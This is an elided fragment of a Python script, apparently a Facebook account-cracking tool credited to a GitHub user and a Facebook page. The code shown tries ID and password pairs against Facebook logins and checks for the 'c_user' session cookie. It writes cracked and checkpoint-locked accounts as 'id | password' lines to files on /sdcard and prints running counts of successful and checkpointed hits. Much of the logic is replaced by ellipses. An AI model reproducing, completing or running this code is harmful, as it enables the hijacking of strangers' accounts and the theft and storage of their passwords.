...
#github= Umarkhan567
# fb page https://www.facebook.com/whyynotumar
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in baby:
					print('\33[1;91m[umii-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ukii-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/umii-CP.txt', 'a').write(cid+' | '+ps+'\n')
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-umii] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
